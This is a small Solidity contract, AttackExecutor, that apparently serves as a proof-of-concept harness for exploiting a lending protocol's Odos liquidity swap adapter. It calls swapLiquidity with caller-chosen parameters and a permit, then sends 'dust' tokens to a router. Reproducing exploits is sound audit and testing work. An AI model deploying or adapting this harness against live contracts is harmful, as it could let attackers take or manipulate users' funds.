// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import { IERC20 } from "contracts/dlend/core/dependencies/openzeppelin/contracts/IERC20.sol";
import { IOdosLiquiditySwapAdapter } from "contracts/dlend/periphery/adapters/odos/interfaces/IOdosLiquiditySwapAdapter.sol";

contract AttackExecutor {
    IERC20 public immutable dustToken;
    address public immutable router;
    IOdosLiquiditySwapAdapter public immutable adapter;

    event DustRepaid(address indexed router, uint256 amount);

    constructor(IERC20 dustToken_, address router_, IOdosLiquiditySwapAdapter adapter_) {
        dustToken = dustToken_;
        router = router_;
        adapter = adapter_;
    }

    function executeAttack(
        IOdosLiquiditySwapAdapter.LiquiditySwapParams calldata params,
        IOdosLiquiditySwapAdapter.PermitInput calldata permitInput,
        uint256 dustRepayAmount
    ) external {
        adapter.swapLiquidity(params, permitInput);

        if (dustRepayAmount > 0) {
            dustToken.transfer(router, dustRepayAmount);
            emit DustRepaid(router, dustRepayAmount);
        }
    }
}
